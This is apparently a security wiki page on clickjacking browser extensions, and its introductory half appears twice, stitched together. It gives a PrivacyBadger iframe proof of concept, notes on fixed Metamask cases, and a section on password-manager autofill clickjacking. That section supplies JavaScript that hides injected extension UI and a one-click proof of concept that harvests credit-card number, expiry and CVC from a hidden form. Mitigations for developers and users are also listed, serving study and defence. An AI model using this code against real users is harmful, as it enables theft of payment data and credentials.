# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

This page is going to abuse a ClickJacking vulnerability in a Browser extension.\
If you don't know what ClickJacking is check:



{{#ref}}
../clickjacking.md
{{#endref}}

Extensions contains the file **`manifest.json`** and that JSON file has a field `web_accessible_resources`. Here's what [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) say about it:

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

The **`web_accessible_resources`** in a browser extension are not just accessible via the web; they also operate with the extension's inherent privileges. This means they have the capability to:

- Change the extension's state
- Load additional resources
- Interact with the browser to a certain extent

However, this feature presents a security risk. If a resource within **`web_accessible_resources`** has any significant functionality, an attacker could potentially embed this resource into an external web page. Unsuspecting users visiting this page might inadvertently activate this embedded resource. Such activation could lead to unintended consequences, depending on the permissions and capabilities of the extension's resources.

## PrivacyBadger Example

In the extension PrivacyBadger, a vulnerability was identified related to the `skin/` directory being declared as `web_accessible_resources` in the following manner (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):

```json
"web_accessible_resources": [
  "skin/*",
  "icons/*"
]
```

This configuration led to a potential security issue. Specifically, the `skin/popup.html` file, which is rendered upon interaction with the PrivacyBadger icon in the browser, could be embedded within an `iframe`. This embedding could be exploited to deceive users into inadvertently clicking on "Disable PrivacyBadger for this Website". Such an action would compromise the user's privacy by disabling the PrivacyBadger protection and potentially subjecting the user to increased tracking. A visual demonstration of this exploit can be viewed in a ClickJacking video example provided at [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

To address this vulnerability, a straightforward solution was implemented: the removal of `/skin/*` from the list of `web_accessible_resources`. This change effectively mitigated the risk by ensuring that the content of the `skin/` directory could not be accessed or manipulated through web-accessible resources.

The fix was easy: **remove `/skin/*` from the `web_accessible_resources`**.

### PoC

```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
  iframe {
    width: 430px;
    height: 300px;
    opacity: 0.01;
    float: top;
    position: absolute;
  }

  #stuff {
    float: top;
    position: absolute;
  }

  button {
    float: top;
    position: absolute;
    top: 168px;
    left: 100px;
  }
</style>

<div id="stuff">
  <h1>Click the button</h1>
  <button id="button">click me</button>
</div>

<iframe
  src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```

## Metamask Example

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In this case, Metamask fixed the vulnerability by checking that the protocol used to access it was **`https:`** or **`http:`** (not **`chrome:`** for example):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** in the Metamask extension was that users were able to **Click to whitelist** when a page was suspicious of being phishing because of `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. As that page was vulnerable to Clickjacking, an attacker could abuse it showing something normal to make the victim click to whitelist it without noticing, and then going back to the phishing page which will be whitelisted.

## Steam Inventory Helper Example

Check the following page to check how a **XSS** in a browser extension was chained with a **ClickJacking** vulnerability:



{{#ref}}
browext-xss-example.md
{{#endref}}

# BrowExt - ClickJacking



## Basic Information

This page is going to abuse a ClickJacking vulnerability in a Browser extension.\
If you don't know what ClickJacking is check:



{{#ref}}
../clickjacking.md
{{#endref}}

Extensions contains the file **`manifest.json`** and that JSON file has a field `web_accessible_resources`. Here's what [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) say about it:

> These resources would then be available in a webpage via the URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

The **`web_accessible_resources`** in a browser extension are not just accessible via the web; they also operate with the extension's inherent privileges. This means they have the capability to:

- Change the extension's state
- Load additional resources
- Interact with the browser to a certain extent

However, this feature presents a security risk. If a resource within **`web_accessible_resources`** has any significant functionality, an attacker could potentially embed this resource into an external web page. Unsuspecting users visiting this page might inadvertently activate this embedded resource. Such activation could lead to unintended consequences, depending on the permissions and capabilities of the extension's resources.

## PrivacyBadger Example

In the extension PrivacyBadger, a vulnerability was identified related to the `skin/` directory being declared as `web_accessible_resources` in the following manner (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):

```json
"web_accessible_resources": [
  "skin/*",
  "icons/*"
]
```

This configuration led to a potential security issue. Specifically, the `skin/popup.html` file, which is rendered upon interaction with the PrivacyBadger icon in the browser, could be embedded within an `iframe`. This embedding could be exploited to deceive users into inadvertently clicking on "Disable PrivacyBadger for this Website". Such an action would compromise the user's privacy by disabling the PrivacyBadger protection and potentially subjecting the user to increased tracking. A visual demonstration of this exploit can be viewed in a ClickJacking video example provided at [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

To address this vulnerability, a straightforward solution was implemented: the removal of `/skin/*` from the list of `web_accessible_resources`. This change effectively mitigated the risk by ensuring that the content of the `skin/` directory could not be accessed or manipulated through web-accessible resources.

The fix was easy: **remove `/skin/*` from the `web_accessible_resources`**.

### PoC

```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
  iframe {
    width: 430px;
    height: 300px;
    opacity: 0.01;
    float: top;
    position: absolute;
  }

  #stuff {
    float: top;
    position: absolute;
  }

  button {
    float: top;
    position: absolute;
    top: 168px;
    left: 100px;
  }
</style>

<div id="stuff">
  <h1>Click the button</h1>
  <button id="button">click me</button>
</div>

<iframe
  src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```

## Metamask Example

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In this case, Metamask fixed the vulnerability by checking that the protocol used to access it was **`https:`** or **`http:`** (not **`chrome:`** for example):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** in the Metamask extension was that users were able to **Click to whitelist** when a page was suspicious of being phishing because of `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. As that page was vulnerable to Clickjacking, an attacker could abuse it showing something normal to make the victim click to whitelist it without noticing, and then going back to the phishing page which will be whitelisted.

## Steam Inventory Helper Example

Check the following page to check how a **XSS** in a browser extension was chained with a **ClickJacking** vulnerability:



{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Manual Autofill)

Several password-manager extensions inject UI elements into the page DOM to support manual autofill (dropdowns, buttons, popovers). These elements can be made invisible while staying interactive. By coercing a single user click on a lure (cookie banner, CAPTCHA, modal close), an attacker can trigger manual autofill and exfiltrate sensitive data filled into attacker-controlled inputs.

Typical flow:

1. Render a lure overlay (e.g., cookie consent) that the victim will click.
2. Insert a hidden form containing target inputs (login/PII/credit card/TOTP).
3. Programmatically focus() an input to summon the extension’s autofill UI.
4. Make the extension UI invisible using DOM/CSS tricks below while keeping it clickable.
5. Position the hidden autofill control under the expected click location or steer it to the cursor.
6. On fill, read values via onchange handlers/DOM and exfiltrate.

### Techniques to hide or bypass the injected UI

- Extension element tampering (root/child): directly manipulate the injected element(s), sometimes via an open Shadow DOM.

```js
// Root element fully transparent
document.querySelector("root-element").style.opacity = 0

// Example: dim Proton Pass custom root
document.querySelector("protonpass-root").style.opacity = 0.5

// Child in open Shadow DOM
const el = Array.from(document.querySelectorAll('*'))
  .find(e => e.tagName.toLowerCase().startsWith('protonpass-root-'))
el.shadowRoot.querySelector('iframe').style.cssText += 'opacity:0 !important;'
```

- Parent element tampering: make BODY/HTML transparent so the extension UI disappears with it; paint a screenshot on <html> to keep the page “visible”.

```js
// Hide the page (also hides extension UI)
document.body.style.opacity = 0
// Replace with a screenshot to preserve appearance
document.documentElement.style.backgroundImage = 'url(website.png)'
```

- Overlay with click-through: cover the page with a full-screen overlay that passes pointer events, while the hidden autofill control sits beneath common click targets.

```css
/* Full overlay that passes clicks */
#overlay { pointer-events:none; position:fixed; inset:0; z-index:2147483647; opacity:0.5; }
```

Additional positioning tricks include repeatedly focusing inputs and moving the hidden form so the autofill menu tracks the cursor, or placing the invisible autofill action beneath expected controls (Accept/Decline cookies, CAPTCHA checkbox, dialog close).

### Reference PoC: credit‑card exfiltration with one click

```html
<script>
// CREDIT CARD FORM
var cardform = document.getElementById('cardform');
if (!cardform) {
  cardform = document.createElement('cardform');
  cardform.id = 'cardform';
  cardform.style = "position:fixed;bottom:0;left:0;z-index:2147483647;opacity:0.1";
  cardform.innerHTML = `
    <form id="creditcard" onchange="getCardValues()" autocomplete="off" novalidate style="opacity:0.1">
      <input id="cardnumber" autocomplete="cc-number new-password" maxlength="19" inputmode="numeric" />
      <input id="expiry" autocomplete="off" inputmode="numeric" />
      <input id="cvc" autocomplete="cc-csc new-password" maxlength="3" inputmode="numeric" />
    </form>`;
  document.body.appendChild(cardform);
}

// Position, set background, and trigger the autofill dropdown
setTimeout(function(){
  document.documentElement.style.backgroundImage = "url(website.png)";
  document.getElementById('cardform').style = "position:fixed;top:453px;left:467px;z-index:2147483647;";
  document.getElementById('cardnumber').focus();
  document.body.style.opacity = "0.001";
}, 1000);

// Collect filled values
function getCardValues(){
  const n = document.getElementById('cardnumber').value;
  const e = document.getElementById('expiry').value;
  const c = document.getElementById('cvc').value;
  if (e && c) console.log(`cardnumber=${n}&expiry=${e}&cvc=${c}`);
}
</script>
```

### Impact and real‑world pivots

- Credit‑card theft with a single coerced click
- Personal‑data exfiltration (address, phone, etc.)
- Login + TOTP theft via subdomain/XSS: most password managers autofill across subdomains by default, so any XSS on a sibling subdomain can be chained to steal credentials (and stored TOTP) for a high‑value host (e.g., steal creds for `accounts.example.com` via XSS on `test.dev.sandbox.example.com`).
- Passkeys: if relying parties don’t bind WebAuthn challenges to the session, XSS + UI redressing can intercept the signed assertion and replay it server‑side to mint a valid session.

### Limitations

- Extension typically must be unlocked; auto‑lock timers reduce the window of exploitation.
- Spoofed background screenshots must match user viewport to be convincing.

### Mitigations

Developer guidance:

- Monitor and prevent style tampering of injected UI (e.g., MutationObserver); prefer closed Shadow DOM to reduce surface.
- Detect BODY/HTML opacity changes and hostile overlays; consider rendering critical UI to the top layer (Popover) defensively.
- On opening autofill, enumerate potential top‑layer/overlay elements and either close or refuse to display; temporarily remove pointer-events:none on popovers and verify click‑through safety with elementsFromPoint() before fill.
- Require an explicit confirmation dialog before any autofill on untrusted origins.
- Restrict autofill to exact‑domain matches to limit subdomain/XSS pivots.

User guidance:

- Disable manual autofill and prefer copy/paste.
- Restrict credentials to exact‑domain matches.
- Chromium: set extension Site access to “On click” so manual autofill only runs when explicitly granted.

### Demos / verification

- Overview and interactive PoCs: https://websecurity.dev/password-managers/dom-based-extension-clickjacking/
- Personal‑data PoCs: opacity 0.5 → https://websecurity.dev/overlay/index2.html, opacity 0 → https://websecurity.dev/overlay/
- Login PoCs: opacity 0.5 → https://websecurity.dev/overlay/login-opacity.html, opacity 0 → https://websecurity.dev/overlay/login.html

> Note: The legacy iframe‑based extension clickjacking vector loads privileged HTML exposed in web_accessible_resources in a transparent iframe and drives clicks, e.g.:
>
> ```html
> <iframe src="chrome-extension://<EXTENSION_ID>/file.html" style="opacity:0"></iframe>
> ```
>
> Manifest V3 reduces exposure by scoping resources with matches and using X‑Frame‑Options / CSP frame‑ancestors on extension HTML.

## References

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [Research summary – Socket: DOM‑based Extension Clickjacking in Password Managers](https://socket.dev/blog/password-manager-clickjacking)
- [Marek Tóth – DOM‑based Extension Clickjacking (PoC hub)](https://websecurity.dev/password-managers/dom-based-extension-clickjacking/)
- [Overlay PoCs (opacity 0.5 / 0)](https://websecurity.dev/overlay/)
- [Overlay login PoCs (opacity 0.5 / 0)](https://websecurity.dev/overlay/login.html)

{{#include ../../banners/hacktricks-training.md}}
